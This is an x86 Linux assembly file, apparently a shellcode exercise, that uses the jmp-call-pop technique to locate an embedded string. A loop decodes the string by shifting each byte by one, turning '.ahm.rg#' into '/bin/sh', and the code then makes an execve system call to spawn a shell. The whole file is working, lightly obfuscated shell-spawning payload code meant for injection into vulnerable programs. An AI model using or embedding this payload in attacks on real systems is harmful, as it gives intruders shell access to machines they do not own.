global _start
section .text
_start:

jmp short  callme

shellcode:

	pop   esi
	xor   eax, eax
	mov   [esi + 7], al
	lea   ebx, [esi]
	mov   [esi + 8], ebx
	mov   [esi + 12], eax

	mov   cl,7                 ; The loop begins here, we will loop 7 times
loop:
	inc byte [esi + ecx - 1 ]     ; Change the byte on the right location 
	sub  cl, 1                ; Update the counter 'cl'
	jnz loop                  ; Verify if we should break the loop 

	mov   al, 0x0a
	inc eax
	mov   ebx, esi
	lea   ecx, [esi + 8]
	lea   edx, [esi + 12]
	int   0x80

callme:
	call shellcode
	db '.ahm.rg#AAAABBBB'
